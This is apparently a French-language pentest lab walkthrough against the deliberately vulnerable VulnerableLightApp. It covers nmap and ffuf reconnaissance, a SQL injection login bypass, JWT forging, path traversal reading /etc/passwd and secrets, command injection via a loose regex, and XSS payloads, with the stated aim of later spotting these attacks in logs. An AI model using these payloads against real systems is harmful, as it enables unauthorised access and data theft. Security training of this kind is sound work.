# __I. PHASE DE RECONNAISSANCE__

<br>

## __SCANNER POUR DÉCOUVRIR__ (nmap)



### Scan détection des services et versions
```sh
sudo nmap -sS -sV -p- -T4 10.0.0.3 
```
![alt text](<nmap service.png>)

### Scan agressif (OS, version, scripts) — plus bruyant
```sh
sudo nmap -sS -A -p- -T4 10.0.0.3
```

![alt text](<nmap more detailed services.png>)




<br>



## __ÉNUMÉRATION__

### Énumérer les endpoints de l'appli VLA avec burp
```sh
sudo apt update
sudo apt install seclists
```
listes installées dans /usr/share/seclists

Télécharger les Listes d'énumération directement depuis GitHub  
```sh
git clone https://github.com/danielmiessler/SecLists.git 
```

### Énumérer avec FFUZ

ffuf est spécialisé dans les injections SQL, il permet aussi d'énumérer les Endpoints d'une appli
```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.0.0.3:3000/FUZZ -mc 200
```


---


<br>


# __II. GAIN ACCESS__

<br>

## __SQL INJECTION__

### Vérifier si l'appli est vulnérable à l'injection dans le champs utilisateur

* En mettant un `'` dans le nom d'user (Exemple: tot'o) on obtient ici une erreur 500.
* L'Erreur 500 reflète une erreur interne du serveur
* Essayer des injections dans le champ utilisateur
* Essayer d'avoir une réponse 200 de l'application et de pouvoir s'authentifier.
* Le champ password n'est pas injectable car il utilise les hash

Le champ de Login est l'endroit où injecter le payload:

{
  "user": "' OR '1'='1" ,
  "passwd": "string"
}

<br>

Pour en savoir plus sur les injections SQL
[Liste des payloads connues](https://github.com/payloadbox/sql-injection-payload-list)




<br>




## __CONSTRUCTION D'UN TOKEN JWT__

__HEADER.PAYLOAD.SIGNATURE__

* Header → type + algo

* Payload → données (infos utilisateurs)

* Signature → intégrité/authenticité


<br>

* __HEADER__
Indique que le token est un JWT et qu’il utilise l’algorithme de signature HMAC-SHA256.
```
{"alg":"HS256","typ":"JWT"}
```

<br>

* __PAYLOAD__
Ces infos sont lisibles (base64url) mais non chiffrées
```
{
  "user": "' OR '1'='1",
  "passwd": "string"
}
```

<br>

* __SIGNATURE__
La partie de vérification est calculée en combinant le header et le payload avec une clé secrète
```
HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```

<br>

![alt text](<jwtexplained.png>)




<br>




## __S'AUTHENTIFIER AVEC LE TOKEN__

### Modifier la requête dans le repeater avec Burp
```html
GET / HTTP/2
Host: 10.0.0.3:3000
Authorization: Bearer <Token>
Accept: application/json
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
```
![alt text](<TokenInRequest.png>)


```sh
curl -k -i -H "Authorization: Bearer <Token>" "https://10.0.0.3:3000/"
``` 

![alt text](<curl.png>)



S'authentifier dans le naviguateur de Burp

![alt text](<navigateur_auth.png>)

Actualiser le navigateur Burp :

![alt text](<nav_auth.png>)


__Trouver comment trouver le fichier "appsettings.json"__




<br>



## __LOCAL FILE INCLUSION & PATH TRAVERSAL__


Utiliser le paramètre lang pour afficher des fichier de l'application VLA

```
https://10.0.0.3:3000/?lang=appsettings.json
```


Ici on peut voir que ce fichier contient le secret du token VLA :

![alt text](<tokensecret.png>)



* La vulénaribilté LFI permet d'effectuer du `Path Traversal`
* Il est possible de naviguer vers les fichiers de la machine

Ici le contenu du fichier `/etc/passwd`

![alt text](<Path_Traversal.png>)

__Depuis un shell__
```sh
curl -k -i -H "Authorization: Bearer <Token>" https://10.0.0.3:3000/?lang=/etc/passwd
```

![alt text](<Shell_path_Tra.png>)




<br>




## __REMOTE COMMAND EXECUTION__

Utilisation du Endpoint LocalDNSResolver DE VLA

![alt text](<dnsresolver.png>)

Le Endpoint LocalDNSResolver de VLA dans son code source utilise une regex pour accepter le paramètre d'entrée utilisateur
```sh
^(?:[a-zA-Z0-9_\-]+\.)+[a-zA-Z]{2,}(?:.{0,100})$
```
* Le code source initial ouvre un terminal pour exécuter nslookup
* Le paramètre `UserStr` attend une entrée utilisateur ce qui n'et pas conseillé au niveau backend
```C
Effectue une requête DNS pour le FQDN passé en paramètre
            */
            if (Regex.Match(UserStr, @"^(?:[a-zA-Z0-9_\-]+\.)+[a-zA-Z]{2,}(?:.{0,100})$").Success)
            {
                Process Cmd = new Process();
                Cmd.StartInfo.FileName = RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? "powershell" : "/bin/sh";
                Cmd.StartInfo.RedirectStandardInput = true;
                Cmd.StartInfo.RedirectStandardOutput = true;
                Cmd.StartInfo.CreateNoWindow = true;
                Cmd.StartInfo.UseShellExecute = false;
                Cmd.Start();
                Cmd.WaitForExit(200);
                Cmd.StandardInput.WriteLine("nslookup " + UserStr);
                Cmd.StandardInput.Flush();
                Cmd.StandardInput.Close();
```

* L'entrée normale attendue serait un nom de domaine  ex: `taisen.fr`
* Étant mal programmée, la regex est plus permissive que prévu et permet d'insérer d'autre caractères
* Le endpoint LocalDNSResolver peut être utiilisé pour effectuer des commandes à distance dans terminal du serveur
* Ici un simple `;` permit par la regex nous permet d'exécuter la commande `id`

![alt text](<RCE.png>)





<br>




## __XSS__

__Cross Site Scripting__

<svg/onload=alert(0)>
<marquee onstart=alert(1)>Ma 1ere XSS</marquee>
<script>alert(0)</script>




### Consulter les logs de VLA
```
VulnerableLightApp/bin/Debug/net8.0/*logfile.json
```
Le but pour la suite est de pouvoir retouver les attaques dans les logs :  SQLI, Swagger, LFI, Command Injection, XSS...